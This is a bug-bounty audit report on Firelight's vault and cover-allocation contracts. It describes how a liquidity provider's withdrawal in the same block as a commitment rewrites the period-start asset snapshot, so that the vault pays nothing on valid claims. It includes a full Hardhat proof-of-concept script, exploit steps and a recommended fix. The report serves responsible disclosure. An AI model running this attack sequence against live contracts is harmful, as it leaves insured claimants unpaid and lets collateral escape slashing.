# 88576 sc high commitallocation can underwrite cover against a period start snapshot that a same block withdrawal rewrites letting lp collateral escape slashing

**Submitted on Aug 13th 2026 at 21:39:26 UTC by @CarlosMB for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88576
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Summary

`CoverOrderAllocator` validates current-period cover capacity using:

```solidity
vault.totalAssetsAt(vault.currentPeriodStart())
```

The value is treated as the vault collateral backing the period's committed cover.

However, `totalAssetsAt(periodStart)` is not immutable during the exact period-boundary timestamp. Firelight's custom `Trace256.push()` overwrites the latest checkpoint when another write uses the same timestamp key, while `upperLookupRecent()` returns the last checkpoint with key `<= timestamp`.

As a result, if an honest `commitAllocation(P)` executes in a block whose timestamp is exactly `periodStart(P)`, an LP can execute `withdraw()` later in that same block. The withdrawal writes the post-withdraw active asset balance at the same timestamp and retroactively changes:

```
totalAssetsAt(periodStart(P)): 100 FXRP -> 0 FXRP
```

after the allocator has already accepted a commitment backed by the original 100 FXRP.

The 100 FXRP does **not** leave the vault. It is moved to `withdrawAssets[P + 1]`, which `FirelightVault.payout()` explicitly includes as collateral that remains exposed to incidents captured during `P`.

A later valid claim nevertheless re-reads the rewritten period-start value and caps the vault payout to zero.

The end-to-end PoC reaches:

```
Vault collateral used at commitment:    $100
Funded + approved First Loss Buffer:      $10
Committed / settled cover:               $110
Approved legitimate assessment:          $110

First Loss Buffer actually pays:          $10
Remaining amount requested from vault:   $100
Vault actually pays:                       $0
Valid liability left unpaid:             $100

LP later claims from withdrawAssets[P+1]: $100
```

The protocol therefore settles real cover while the LP collateral that backed it becomes immune to the corresponding valid slash.

***

## Root cause

### 1. Capacity is committed against `totalAssetsAt(currentPeriodStart())`

`CoverOrderAllocator._computeAvailableCapacity()` uses the historical vault query:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

`commitAllocation()` then validates the submitted matching result against that capacity and persists the commitment:

```solidity
_validateMatchingCapacity(
    $,
    currentPeriod,
    matchingCapacity,
    totalAllocated
);

commit.root = merkleRoot;
commit.totalAvailableCapacity = matchingCapacity;
commit.totalDeclaredAllocated = totalAllocated;
```

Thus an underwriting decision is persisted based on the value returned by the period-start historical query.

### 2. The supposedly historical value is still mutable at the boundary timestamp

`FirelightVault.totalAssetsAt()` is:

```solidity
function totalAssetsAt(uint48 timestamp)
    public
    view
    returns (uint256)
{
    return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

Firelight's custom checkpoint implementation contains:

```solidity
(bool exists, uint48 lastKey,) =
    self._trace.latestCheckpoint();

if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

and the lookup returns the latest checkpoint whose key is lower than or equal to the requested timestamp.

Therefore a write at:

```
key == periodStart(P)
```

can change the value returned by `totalAssetsAt(periodStart(P))` even after another transaction in the same block has already consumed the previous value.

### 3. Permissionless `withdraw()` performs exactly such a write

`withdraw()` requests the delayed withdrawal and then calls `_logTrace()` using the post-withdraw totals.

`_logTrace()` writes:

```solidity
uint48 ts = Time.timestamp();

...

if (isLogAssets) {
    _traceTotalAssets.push(ts, _totalAssets);
}
```

If:

```
block.timestamp == periodStart(P)
```

then an LP withdrawal executed after `commitAllocation(P)` in that block writes the new active asset value at the exact key already used for underwriting.

***

## Why the collateral is still supposed to be slashable

A withdrawal initiated during `P` is assigned to:

```solidity
uint256 period = currentPeriod() + 1;
```

so the assets become:

```
withdrawAssets[P + 1]
```

They remain physically held by the vault.

`FirelightVault.payout()` explicitly includes this exact bucket for an incident captured in `P`:

```solidity
uint256 capturePeriodWithdrawals =
    withdrawAssets[capturePeriod + 1];
```

The implementation documents these withdrawals as remaining payable while the payout window is open.

The vulnerability therefore does not rely on the LP legitimately leaving the risk set. The funds remain in the protocol's own current-period slashable accounting.

## Proof of Concept

## End-to-end exploit

Let:

```
T = periodStart(P)

Vault collateral = 100 FXRP = $100
FLB balance       = 10 USDC = $10
Effective capacity multiplier = 1x
```

The PoC uses a 30-day vault period and splits the cover across two independent protocol-concentration groups:

```
Morpho allocation: $66 (60%)
Aave allocation:   $44 (40%)
Total:             $110
```

### 1. A legitimate order is created during P-1

The buyer creates a `$110` order for `P`.

The LP has deposited 100 FXRP.

The external FLB wallet holds 10 USDC and has approved `IncidentManager`.

No oracle depeg or stale price is used; the vault asset oracle is refreshed to `$1` immediately before the boundary.

### 2. Honest commitment at T

At the first valid period-P timestamp:

```
block.timestamp = T
```

the honest allocator executes:

```
commitAllocation(P, root, $110, $110)
```

The live capacity validation sees:

```
vault period-start assets = $100
FLB                        =  $10
total                      = $110
```

and accepts the commitment.

### 3. LP withdraws later in the same block

The LP executes:

```
withdraw(100 FXRP)
```

later in the same block.

The withdrawal produces:

```
totalAssets()              = 0
withdrawAssets[P + 1]      = 100 FXRP
pendingWithdrawAssets      = 100 FXRP
physical vault balance     = 100 FXRP
```

and `_logTrace()` writes the post-withdraw active value using the same timestamp `T`.

After the block:

```
commit.totalAvailableCapacity = $110
commit.totalDeclaredAllocated = $110

totalAssetsAt(T)               = 0
withdrawAssets[P + 1]          = 100 FXRP
physical vault balance         = 100 FXRP
```

The underwriting decision remains, but the historical exposure value it was based on has changed.

### 4. Cover settles normally

After a non-zero one-hour settlement grace, the allocator settles the committed tree.

The real `CoverNFT` is minted and the order becomes fully matched:

```
Morpho settled = $66
Aave settled   = $44
total settled  = $110
```

Settlement does not re-establish the original vault exposure snapshot.

### 5. A legitimate incident is approved

The PoC uses the real `IncidentManager` lifecycle:

```
createIncident()
confirmIncident()
addAssessmentLosses()
submitCurrentAssessment()
approveCurrentAssessment()
```

There is one incident and one assessment round.

The assessment contains exactly the settled losses:

```
Morpho: $66
Aave:   $44
total: $110
```

No duplicate or excessive claim is used.

`IncidentManager` first pulls the properly funded FLB:

```
FLB payment = $10
```

and then requests the remaining `$100` from `FirelightVault`.

### 6. Vault payout is incorrectly capped to zero

`payout()` calculates:

```solidity
uint256 assetsAtCapturePeriod =
    totalAssetsAt(capturePeriodStart);

uint256 currentActiveAssets =
    totalAssets();

uint256 capturePeriodWithdrawals =
    withdrawAssets[capturePeriod + 1];

uint256 activePayableAmount =
    currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;

paidAmount = Math.min(
    amount,
    Math.min(assetsAtCapturePeriod, activePayableAmount)
);
```

The state is:

```
requested vault payment     = 100 FXRP
assetsAtCapturePeriod       = 0
currentActiveAssets         = 0
capturePeriodWithdrawals    = 100 FXRP
activePayableAmount         = 100 FXRP
```

so:

```
paidAmount
= min(100, min(0, 100))
= 0
```

The legitimate `$110` assessment therefore receives only the `$10` FLB.

The `$100` vault-backed portion is left unpaid.

### 7. LP later recovers all collateral

Because the vault paid zero, `withdrawAssets[P + 1]` remains untouched.

After the delayed withdrawal becomes claimable:

```solidity
claimWithdraw(P + 1)
```

returns the complete:

```
100 FXRP
```

to the LP.

Terminal state:

```
Settled cover:                 $110
Approved legitimate loss:      $110

FLB paid:                       $10
Vault paid:                      $0
Unpaid valid liability:        $100

LP recovered collateral:       $100
```

***

## Impact

**Protocol insolvency.**

The protocol sells and settles coverage using vault collateral that a permissionless LP can subsequently make unavailable to the exact claim that collateral is intended to secure.

The attack is not based on:

* an unfunded or unapproved First Loss Buffer;
* a stablecoin depeg;
* oracle manipulation or a stale oracle;
* duplicate claims;
* an assessment exceeding settled cover;
* a malicious curator, allocator, or assessment approver;
* a zero settlement grace;
* or an unusual one-market 100% concentration configuration.

All privileged actors in the PoC follow their intended lifecycle. The attacker only performs ordinary LP actions:

```
deposit()
withdraw()
claimWithdraw()
```

***

## Feasibility precondition

The exploit is opportunistic and requires a block satisfying:

```
block.timestamp == periodStart(P)
```

with ordering:

```
1. commitAllocation(P)
2. LP withdraw()
```

inside that block.

This is the earliest timestamp at which the commitment for `P` is valid, because `commitAllocation()` requires `commitmentPeriod == currentPeriod()`.

The PoC does not modify contract storage to manufacture this state. It only controls the local block timestamp and transaction ordering to deterministically reproduce a valid EVM execution.

A non-zero one-hour settlement grace is used. No settlement occurs before the grace expires.

***

## Proof of Concept

Save as:

```
test/critical_period_boundary_snapshot_e2e.js
```

and run:

```bash
npx hardhat test test/critical_period_boundary_snapshot_e2e.js
```

```javascript
const { expect } = require('chai')
const { ethers, upgrades, network } = require('hardhat')
const { time } = require('@nomicfoundation/hardhat-network-helpers')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')
const { deployVault, computeMarketId } = require('./setup/fixtures.js')

describe('Critical: period-boundary withdrawal rewrites collateral snapshot after cover commitment', function () {
  it('settles $110 of cover, pays only the $10 FLB, and lets the LP escape with the $100 vault collateral', async function () {
    const DURATION = 30n * 24n * 60n * 60n

    // Vault collateral = $100 at a $1 asset price.
    const ASSETS = ethers.parseUnits('100', 6)

    // The FLB is correctly funded with $10 and pre-approves IncidentManager.
    const FLB = ethers.parseUnits('10', 6)

    // Total legitimate capacity = $100 vault + $10 FLB = $110.
    const COVER = ethers.parseUnits('110', 18)
    const COVER_MORPHO = ethers.parseUnits('66', 18) // 60%
    const COVER_AAVE = ethers.parseUnits('44', 18)   // 40%
    expect(COVER_MORPHO + COVER_AAVE).to.equal(COVER)

    const vaultCtx = await deployVault({
      decimals: 6,
      initial_deposit_limit: ethers.parseUnits('1000', 6),
      period_configuration_duration: Number(DURATION)
    })

    const {
      firelight_vault: vault,
      token_contract: asset,
      deployer,
      payout_allowlister,
      users,
      utils
    } = vaultCtx

    const attacker = users[0]

    async function fundedRandomSigner() {
      const wallet = ethers.Wallet.createRandom().connect(ethers.provider)
      await ethers.provider.send('hardhat_setBalance', [
        wallet.address,
        '0x3635C9ADC5DEA00000'
      ])
      return wallet
    }

    const coverCurator = await fundedRandomSigner()
    const allocatorRole = await fundedRandomSigner()
    const configAdmin = await fundedRandomSigner()
    const allocatorAdminRole = await fundedRandomSigner()
    const premiumCollector = await fundedRandomSigner()
    const firstLossBufferWallet = await fundedRandomSigner()
    const buyer = await fundedRandomSigner()

    const incidentCurator = await fundedRandomSigner()
    const assessmentApprover = await fundedRandomSigner()
    const assessmentRejecter = await fundedRandomSigner()
    const incidentInvalidator = await fundedRandomSigner()
    const incidentConfigAdmin = await fundedRandomSigner()
    const payoutAdmin = await fundedRandomSigner()
    const priceFeedAdmin = await fundedRandomSigner()
    const payoutReceiver = await fundedRandomSigner()

    // ---------------------------------------------------------------------
    // 1. Deploy the real CoverOrderAllocator + CoverNFT and real IncidentManager
    //    against the real FirelightVault.
    // ---------------------------------------------------------------------
    const MockERC20 = await ethers.getContractFactory('MockERC20')
    const usdc = await MockERC20.deploy('MockUSDC', 'mUSDC', 6)

    const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
    const priceFeed = await MockAggregator.deploy(18, ethers.parseUnits('1', 18))

    const CoverNFT = await ethers.getContractFactory('CoverNFT')
    const coverNFT = await upgrades.deployProxy(
      CoverNFT,
      [
        'Firelight Cover',
        'FLCOVER',
        '',
        deployer.address,
        ethers.ZeroAddress,
        ethers.ZeroAddress,
        ethers.ZeroAddress
      ],
      { kind: 'transparent' }
    )

    const protocolMorpho = 'Morpho'
    const chainIdMorpho = 1
    const marketMorpho = ethers.encodeBytes32String('market-A')
    const marketIdMorpho = computeMarketId(chainIdMorpho, protocolMorpho, marketMorpho)

    const protocolAave = 'Aave'
    const chainIdAave = 10
    const marketAave = ethers.encodeBytes32String('market-B')
    const marketIdAave = computeMarketId(chainIdAave, protocolAave, marketAave)

    const Allocator = await ethers.getContractFactory('CoverOrderAllocator')
    const allocator = await upgrades.deployProxy(
      Allocator,
      [{
        vault: await vault.getAddress(),
        premiumCollector: premiumCollector.address,
        coverNFT: await coverNFT.getAddress(),
        priceFeedAdapter: await priceFeed.getAddress(),
        maxPriceAge: 7 * 24 * 3600,
        premiumTokens: [await usdc.getAddress()],
        admin: deployer.address,
        adminRole: allocatorAdminRole.address,
        curatorRole: coverCurator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: configAdmin.address,
        initialProtocolConcentrations: [
          {
            protocol: protocolMorpho,
            chainId: chainIdMorpho,
            maxProtocolConcentrationBps: 6_000
          },
          {
            protocol: protocolAave,
            chainId: chainIdAave,
            maxProtocolConcentrationBps: 4_000
          }
        ],
        newMarkets: [
          { chainId: chainIdMorpho, protocol: protocolMorpho, market: marketMorpho },
          { chainId: chainIdAave, protocol: protocolAave, market: marketAave }
        ],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: await usdc.getAddress(),
          firstLossBuffer: firstLossBufferWallet.address,
          effectiveLeverage: 12_000, // exactly 1x combined collateral capacity
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0
        }
      }],
      {
        kind: 'transparent',
        unsafeAllow: ['missing-initializer-call']
      }
    )

    await coverNFT
      .connect(deployer)
      .grantRole(await coverNFT.MINTER_ROLE(), await allocator.getAddress())

    // Use a non-zero, realistic settlement grace. The exploit does not rely on
    // the allocator's default zero-grace initialization.
    const SETTLEMENT_GRACE = 60 * 60 // 1 hour
    await allocator
      .connect(configAdmin)
      .setSettlementGracePeriod(SETTLEMENT_GRACE)

    const IncidentManager = await ethers.getContractFactory('IncidentManager')
    const incidentManager = await upgrades.deployProxy(
      IncidentManager,
      [
        deployer.address,
        incidentCurator.address,
        assessmentApprover.address,
        assessmentRejecter.address,
        incidentInvalidator.address,
        incidentConfigAdmin.address,
        payoutAdmin.address,
        priceFeedAdmin.address,
        payoutReceiver.address,
        await allocator.getAddress(),
        await priceFeed.getAddress(),
        7 * 24 * 3600
      ],
      {
        kind: 'transparent',
        unsafeAllow: ['missing-initializer-call']
      }
    )

    // IncidentManager is the normal protocol actor that changes the vault incident flag
    // and executes approved payouts.
    await vault
      .connect(deployer)
      .grantRole(await vault.INCIDENT_ROLE(), await incidentManager.getAddress())

    await vault
      .connect(deployer)
      .grantRole(await vault.PAYOUT_ROLE(), await incidentManager.getAddress())

    await vault
      .connect(payout_allowlister)
      .addToPayoutAllowlist(payoutReceiver.address)

    // Satisfy the program's FLB trust assumption:
    // the external FLB wallet is genuinely funded and has given IncidentManager
    // the approval required to pay an approved claim.
    await usdc.mint(firstLossBufferWallet.address, FLB)

    await usdc
      .connect(firstLossBufferWallet)
      .approve(await incidentManager.getAddress(), ethers.MaxUint256)

    expect(await usdc.balanceOf(firstLossBufferWallet.address)).to.equal(FLB)
    expect(
      await usdc.allowance(firstLossBufferWallet.address, await incidentManager.getAddress())
    ).to.equal(ethers.MaxUint256)

    // ---------------------------------------------------------------------
    // 2. In P-1, the attacker is the sole LP and a legitimate $110 cover order
    //    is created for next period P across two concentration groups (60/40).
    //
    // Capacity at the P boundary will be:
    //   $100 vault collateral + $10 funded FLB = $110.
    // ---------------------------------------------------------------------
    await utils.mintAndApprove(ASSETS, attacker)
    await vault.connect(attacker).deposit(ASSETS, attacker.address)

    expect(await vault.totalAssets()).to.equal(ASSETS)
    expect(await vault.totalSupply()).to.equal(ASSETS)

    // Buyer funding is independent from the FLB.
    await usdc.mint(buyer.address, ethers.parseUnits('10', 6))
    expect(await usdc.balanceOf(firstLossBufferWallet.address)).to.equal(FLB)

    await usdc
      .connect(buyer)
      .approve(await allocator.getAddress(), ethers.MaxUint256)

    await allocator
      .connect(coverCurator)
      .createCoverOrder(
        buyer.address,
        buyer.address,
        'beneficiary',
        await usdc.getAddress(),
        [
          {
            marketId: marketIdMorpho,
            coverRateAnnual: 100,
            coverAmount: COVER_MORPHO
          },
          {
            marketId: marketIdAave,
            coverRateAnnual: 100,
            coverAmount: COVER_AAVE
          }
        ],
        0 // NEW
      )

    const orderBefore = await allocator.getCoverOrder(0)
    const P = orderBefore.period
    expect(P).to.equal((await vault.currentPeriod()) + 1n)

    const T = await vault.currentPeriodEnd()

    const allocations = [
      [marketIdMorpho, COVER_MORPHO],
      [marketIdAave, COVER_AAVE]
    ]
    const tree = StandardMerkleTree.of(
      [[0n, allocations]],
      ['uint256', '(bytes32,uint256)[]']
    )

    // Keep the oracle fresh at the period boundary. This is a normal $1 update;
    // the PoC does not rely on stale/oracle-manipulated pricing.
    await time.increaseTo(T - 60n)
    await priceFeed.setAnswer(ethers.parseUnits('1', 18))

    // ---------------------------------------------------------------------
    // 3. Boundary block at exactly periodStart(P) = T.
    //
    //    tx 1: honest allocator commits against the legitimate $110 capacity.
    //    tx 2: attacker withdraws the $100 vault position later in the same
    //          block and writes totalAssets = 0 at the exact timestamp T.
    // ---------------------------------------------------------------------
    await network.provider.send('evm_setAutomine', [false])
    await network.provider.send('evm_setNextBlockTimestamp', [Number(T)])

    const commitTx = await allocator
      .connect(allocatorRole)
      .commitAllocation(
        P,
        tree.root,
        COVER,
        COVER,
        {
          gasLimit: 5_000_000,
          gasPrice: ethers.parseUnits('3', 'gwei')
        }
      )

    const withdrawTx = await vault
      .connect(attacker)
      .withdraw(
        ASSETS,
        attacker.address,
        attacker.address,
        {
          gasLimit: 5_000_000,
          gasPrice: ethers.parseUnits('2', 'gwei')
        }
      )

    await network.provider.send('evm_mine')
    await network.provider.send('evm_setAutomine', [true])

    const commitReceipt = await commitTx.wait()
    const withdrawReceipt = await withdrawTx.wait()

    expect(commitReceipt.blockNumber).to.equal(withdrawReceipt.blockNumber)
    expect(commitReceipt.index).to.be.lessThan(withdrawReceipt.index)

    const boundaryBlock = await ethers.provider.getBlock(commitReceipt.blockNumber)
    expect(BigInt(boundaryBlock.timestamp)).to.equal(T)
    expect(await vault.currentPeriod()).to.equal(P)
    expect(await vault.currentPeriodStart()).to.equal(T)

    const commitment = await allocator.getAllocationCommitment(P)

    // The honest commit saw the full $110:
    //   $100 vault + $10 correctly funded FLB.
    expect(commitment.totalAvailableCapacity).to.equal(COVER)
    expect(commitment.totalDeclaredAllocated).to.equal(COVER)

    // The same period-start vault query that contributed $100 to the accepted
    // capacity now returns zero after the later same-timestamp withdrawal.
    expect(await vault.totalAssetsAt(T)).to.equal(0n)

    // The $100 vault collateral did not leave the contract. It moved into P+1's
    // pending-withdrawal bucket, which payout() explicitly considers exposed to P.
    expect(await vault.totalAssets()).to.equal(0n)
    expect(await vault.withdrawAssets(P + 1n)).to.equal(ASSETS)
    expect(await vault.pendingWithdrawAssets()).to.equal(ASSETS)
    expect(await asset.balanceOf(await vault.getAddress())).to.equal(ASSETS)

    // FLB remains correctly funded after the commit and withdrawal.
    expect(await usdc.balanceOf(firstLossBufferWallet.address)).to.equal(FLB)

    // ---------------------------------------------------------------------
    // 4. The already-committed $110 cover settles normally.
    // ---------------------------------------------------------------------
    const graceExpiresAt = commitment.graceExpiresAt
    if (BigInt(await time.latest()) <= graceExpiresAt) {
      await time.increaseTo(graceExpiresAt + 1n)
    }

    await allocator
      .connect(allocatorRole)
      .settleCoverOrder(
        0,
        [
          { marketId: marketIdMorpho, allocatedCover: COVER_MORPHO },
          { marketId: marketIdAave, allocatedCover: COVER_AAVE }
        ],
        tree.getProof(0)
      )

    const settledOrder = await allocator.getCoverOrder(0)
    expect(settledOrder.status).to.equal(1n) // MATCHED
    expect(settledOrder.allocatedCoverAmount).to.equal(COVER)
    expect(await coverNFT.ownerOf(0)).to.equal(buyer.address)

    // ---------------------------------------------------------------------
    // 5. A real IncidentManager lifecycle processes one legitimate P incident
    //    for exactly the $110 cover that was actually settled.
    // ---------------------------------------------------------------------
    const captureTimestamp = BigInt(await time.latest())
    expect(await vault.periodAtTimestamp(captureTimestamp)).to.equal(P)

    const incidentRef = ethers.keccak256(
      ethers.toUtf8Bytes('period-boundary-valid-incident')
    )

    await incidentManager
      .connect(incidentCurator)
      .createIncident(
        captureTimestamp,
        'Valid P incident',
        incidentRef
      )

    await incidentManager
      .connect(incidentCurator)
      .confirmIncident(1, 'ipfs://valid-incident-report')

    await incidentManager
      .connect(incidentCurator)
      .addAssessmentLosses(1, [
        {
          coverTokenId: 0,
          marketId: marketIdMorpho,
          amount: COVER_MORPHO
        },
        {
          coverTokenId: 0,
          marketId: marketIdAave,
          amount: COVER_AAVE
        }
      ])

    await incidentManager
      .connect(incidentCurator)
      .submitCurrentAssessment(1)

    const receiverAssetBefore = await asset.balanceOf(payoutReceiver.address)
    const receiverFlbBefore = await usdc.balanceOf(payoutReceiver.address)

    // The $110 approved loss is legitimate and exactly bounded by settled cover.
    //
    // IncidentManager first pays the correctly funded $10 FLB.
    // It then requests the remaining $100 from FirelightVault.
    // Because totalAssetsAt(periodStart(P)) was retroactively rewritten to 0,
    // FirelightVault pays 0 even though the same $100 remains in withdrawAssets[P+1].
    await expect(
      incidentManager
        .connect(assessmentApprover)
        .approveCurrentAssessment(1)
    )
      .to.emit(vault, 'PayoutExecuted')
      .withArgs(
        payoutReceiver.address,
        ASSETS, // remaining $100 requested from the vault
        0n,
        captureTimestamp
      )

    const [closedIncident, incidentExists] = await incidentManager.getIncident(1)
    expect(incidentExists).to.equal(true)
    expect(closedIncident.status).to.equal(4n) // CLOSED
    expect(closedIncident.vaultPaidAmount).to.equal(0n)

    // Trust assumptions are fully satisfied:
    // the FLB was funded, approved, and successfully paid its full $10.
    expect(await usdc.balanceOf(firstLossBufferWallet.address)).to.equal(0n)
    expect(await usdc.balanceOf(payoutReceiver.address)).to.equal(receiverFlbBefore + FLB)

    // But the vault-backed $100 portion of the legitimate $110 claim receives zero.
    expect(await asset.balanceOf(payoutReceiver.address)).to.equal(receiverAssetBefore)

    // The exact $100 that should have remained slashable still sits in the LP
    // withdrawal bucket untouched.
    expect(await vault.withdrawAssets(P + 1n)).to.equal(ASSETS)
    expect(await vault.pendingWithdrawAssets()).to.equal(ASSETS)
    expect(await asset.balanceOf(await vault.getAddress())).to.equal(ASSETS)

    // ---------------------------------------------------------------------
    // 6. Once P+1 has ended, the attacker claims the full $100 collateral.
    // ---------------------------------------------------------------------
    await time.increaseTo(T + 2n * DURATION)
    expect(await vault.currentPeriod()).to.be.greaterThan(P + 1n)

    const attackerBalanceBefore = await asset.balanceOf(attacker.address)

    await vault
      .connect(attacker)
      .claimWithdraw(P + 1n)

    const attackerBalanceAfter = await asset.balanceOf(attacker.address)

    expect(attackerBalanceAfter - attackerBalanceBefore).to.equal(ASSETS)
    expect(await vault.pendingWithdrawAssets()).to.equal(0n)
    expect(await asset.balanceOf(await vault.getAddress())).to.equal(0n)

    // Final security state:
    //   - legitimate total capacity at commit:      $110
    //   - legitimate settled cover:                 $110
    //   - approved legitimate assessment:           $110
    //   - FLB paid as trusted/expected:              $10
    //   - vault-backed portion paid:                  $0
    //   - unpaid valid liability:                   $100
    //   - LP recovered escaped vault collateral:    $100
    expect(settledOrder.allocatedCoverAmount).to.equal(COVER)
    expect(closedIncident.vaultPaidAmount).to.equal(0n)
    expect(attackerBalanceAfter - attackerBalanceBefore).to.equal(ASSETS)
  })
})

```

Expected terminal assertions:

```
commit.totalAvailableCapacity    = $110
commit.totalDeclaredAllocated    = $110

same boundary block:
    commit tx index              < withdrawal tx index
    block.timestamp              = periodStart(P)

after withdrawal:
    totalAssetsAt(periodStart(P)) = 0
    withdrawAssets[P + 1]         = 100 FXRP
    physical vault balance        = 100 FXRP
    FLB balance                   = $10

after settlement:
    allocated cover               = $110
    CoverNFT exists               = true

after approved assessment:
    total legitimate loss         = $110
    FLB transferred               = $10
    vault requested               = 100 FXRP
    vault paid                    = 0
    incident                      = CLOSED

after withdrawal maturity:
    LP claims                     = 100 FXRP
    vault balance                 = 0
```

***

## Recommended mitigation

The period-start exposure used for underwriting and payout must become immutable once period `P` begins.

A robust design is to materialize the exposure once per period:

```solidity
mapping(uint256 period => uint256 assets)
    public periodStartAssets;
```

and enforce:

```
periodStartAssets[P] is initialized once
and cannot be changed by any transaction occurring during P.
```

Both `CoverOrderAllocator` capacity validation and `FirelightVault.payout()` should consume the same immutable value.

Alternatively, the historical lookup semantics must exclude all writes occurring after the boundary state has been established, including writes sharing the exact boundary timestamp.

The required invariant is:

```
Once period-P cover capacity has been accepted,
no later permissionless operation can change the period-P
vault exposure cap used to satisfy valid claims.
```
